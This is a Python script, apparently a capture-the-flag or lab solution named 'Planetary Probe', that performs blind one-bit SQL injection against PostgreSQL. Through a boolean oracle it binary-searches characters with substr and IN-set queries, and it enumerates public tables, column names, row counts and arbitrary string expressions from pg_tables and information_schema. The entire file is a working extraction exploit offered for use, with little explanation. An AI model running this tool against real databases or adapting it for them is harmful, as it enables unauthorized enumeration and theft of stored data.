"""Planetary Probe — blind one-bit extractor (Postgres, substr + IN-set binary search).

The oracle answers exactly one bit, so every character costs ceil(log2(|set|)) queries
and every integer costs log2(range). Comparison order is never trusted: membership in an
explicit candidate set is asked instead, which is collation independent.
"""
import sys
import time
from oracle import ask

PRINTABLE = [chr(c) for c in range(32, 127)]
STATS = {"q": 0, "t0": time.time()}


def bit(expr):
    STATS["q"] += 1
    return ask(expr)


def lit(c):
    return "'" + c.replace("'", "''") + "'"


def get_int(expr, lo=0, hi=100):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if bit("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def one_char(expr, i, cands=None):
    cands = list(PRINTABLE) if cands is None else list(cands)
    while len(cands) > 1:
        half = cands[:len(cands) // 2]
        q = "(SELECT substr((%s),%d,1)) IN (%s)" % (expr, i, ",".join(lit(c) for c in half))
        cands = half if bit(q) else cands[len(half):]
    return cands[0]


def get_str(expr, n=None, cands=None):
    if n is None:
        n = get_int("length((%s))" % expr, 0, 200)
    out = []
    for i in range(1, n + 1):
        out.append(one_char(expr, i, cands))
        sys.stdout.write("\r[%d/%d] %s" % (i, n, "".join(out)))
        sys.stdout.flush()
    sys.stdout.write("\n")
    return "".join(out)


def count(from_where):
    return get_int("(SELECT COUNT(*) %s)" % from_where, 0, 500)


def nth(from_where, order, col, i):
    return "(SELECT %s %s ORDER BY %s LIMIT 1 OFFSET %d)" % (col, from_where, order, i)


if __name__ == "__main__":
    mode = sys.argv[1]
    PUB = "FROM pg_tables WHERE schemaname='public'"
    if mode == "tables":
        n = count(PUB)
        print("public tables:", n)
        for i in range(n):
            print("  %-24s <- %s" % (get_str(nth(PUB, "tablename", "tablename", i)), i))
    elif mode == "cols":
        t = sys.argv[2]
        w = "FROM information_schema.columns WHERE table_name='%s'" % t
        n = count(w)
        print("%s columns: %d" % (t, n))
        for i in range(n):
            print("  %-24s <- %s" % (get_str(nth(w, "column_name", "column_name", i)), i))
    elif mode == "rows":
        t = sys.argv[2]
        print("rows:", count("FROM %s" % t))
    elif mode == "str":
        print(get_str(sys.argv[2]))
    elif mode == "int":
        print(get_int(sys.argv[2], 0, int(sys.argv[3]) if len(sys.argv) > 3 else 200))
    print("[*] %d queries, %.0fs" % (STATS["q"], time.time() - STATS["t0"]))
